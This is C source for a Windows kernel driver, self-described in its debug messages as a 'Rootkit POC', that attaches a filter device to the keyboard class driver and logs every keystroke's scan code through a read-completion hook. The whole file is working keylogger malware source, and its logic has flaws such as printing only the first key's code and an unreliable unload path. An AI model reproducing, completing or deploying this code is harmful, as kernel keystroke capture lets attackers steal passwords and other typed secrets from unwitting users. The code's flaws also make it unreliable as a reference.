#include <ntddk.h>

typedef struct
{
    PDEVICE_OBJECT LowerKbdDevice;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

typedef struct _KEYBOARD_INPUT_DATA
{
    USHORT UnitId;
    USHORT MakeCode;
    USHORT Flags;
    USHORT Reserved;
    ULONG ExtraInformation;
} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;

UNICODE_STRING G_DEVICE_NAME;
UNICODE_STRING G_DEVICE_SYMBOLIC_LINK;

PDEVICE_OBJECT myKeyboardDevice = NULL;

ULONG pendingKey = 0;

VOID
DriverUnload(
    _In_ PDRIVER_OBJECT pDriverObject
)
{
    LARGE_INTEGER interval = {0};
    interval.QuadPart = -10 * 1000 * 1000;

    PDEVICE_OBJECT DeviceObject = pDriverObject->DeviceObject;

    IoDetachDevice(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->LowerKbdDevice);

    while (pendingKey)
    {
        KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }

    IoDeleteDevice(myKeyboardDevice);

    DbgPrint("Rootkit POC: Unloading... Service has stopped");
}

NTSTATUS
DriverPassthrough(
    _In_ PDEVICE_OBJECT pDeviceObject,
    _In_ PIRP pIrp
)
{
    IoCopyCurrentIrpStackLocationToNext(pIrp);

    return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->LowerKbdDevice, pIrp);
}

NTSTATUS
ReadOperationFinished(
    _In_ PDEVICE_OBJECT pDeviceObject,
    _In_ PIRP pIrp,
    _In_ PVOID context
)
{
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(context);

    PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;

    ULONG_PTR structnum = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

    if (pIrp->IoStatus.Status == STATUS_SUCCESS)
    {
        for (int i = 0; i < structnum; i++)
        {
            if (keys[i].Flags == 0)
            {
                DbgPrint("Rootkit POC: Keylogger says %x\n", keys->MakeCode);
            }
        }
    }

    if (pIrp->PendingReturned)
    {
        IoMarkIrpPending(pIrp);
    }

    pendingKey--;

    return pIrp->IoStatus.Status;
}

NTSTATUS
DriverReadKeystrokes(
    _In_ PDEVICE_OBJECT pDeviceObject,
    _In_ PIRP pIrp
)
{
    IoCopyCurrentIrpStackLocationToNext(pIrp);

    IoSetCompletionRoutine(pIrp, ReadOperationFinished, NULL, TRUE, TRUE, TRUE);

    pendingKey++;

    return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->LowerKbdDevice, pIrp);
}

NTSTATUS
DriverAttachKeyboard(
    _In_ PDRIVER_OBJECT pDriverObject
)
{
    NTSTATUS Status;
    UNICODE_STRING TargetDevice = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");

    Status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, FALSE, &myKeyboardDevice);
    if (!NT_SUCCESS(Status))
    {
        DbgPrint("Rootkit POC Failed: Error creating device for keyboard -> Status: 0x%08X\n", Status);
        return Status;
    }

    myKeyboardDevice->Flags |= DO_BUFFERED_IO;
    myKeyboardDevice->Flags &= ~DO_DEVICE_INITIALIZING;

    RtlZeroMemory(myKeyboardDevice->DeviceExtension, sizeof(DEVICE_EXTENSION));

    Status = IoAttachDevice(myKeyboardDevice, &TargetDevice, &((PDEVICE_EXTENSION)myKeyboardDevice->DeviceExtension)->LowerKbdDevice);
    if (!NT_SUCCESS(Status))
    {
        IoDeleteDevice(myKeyboardDevice);
        return Status;
    }

    return STATUS_SUCCESS;
}

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT pDriverObject,
    _In_ PUNICODE_STRING pRegistryPath
)
{
    UNREFERENCED_PARAMETER(pRegistryPath);

    NTSTATUS Status;

    RtlInitUnicodeString(&G_DEVICE_NAME, L"\\Device\\MyKernelDriver");
    RtlInitUnicodeString(&G_DEVICE_SYMBOLIC_LINK, L"\\DosDevices\\MyKernelDriver");

    pDriverObject->DriverUnload = DriverUnload;

    for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
    {
        pDriverObject->MajorFunction[i] = DriverPassthrough;
    }

    pDriverObject->MajorFunction[IRP_MJ_READ] = DriverReadKeystrokes;

    Status = IoCreateDevice(pDriverObject, 0, &G_DEVICE_NAME, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDriverObject->DeviceObject);
    if (!NT_SUCCESS(Status))
    {
        DbgPrint("Rootkit POC Failed: Error creating device -> Status: 0x%08X\n", Status);
        return Status;
    }

    Status = IoCreateSymbolicLink(&G_DEVICE_SYMBOLIC_LINK, &G_DEVICE_NAME);
    if (!NT_SUCCESS(Status))
    {
        DbgPrint("Rootkit POC Failed: Error creating symbolic link -> Status: 0x%08X\n", Status);
        return Status;
    }

    Status = DriverAttachKeyboard(pDriverObject);
    if (!NT_SUCCESS(Status))
    {
        DbgPrint("Rootkit POC Failed: Error attaching keyboard -> Status: 0x%08X\n", Status);
        return Status;
    }

    DbgPrint("Rootkit POC: Loading... Hello World");

    DbgPrint("Rootkit POC: Keyboard was attached successfully\n");

    return STATUS_SUCCESS;
}
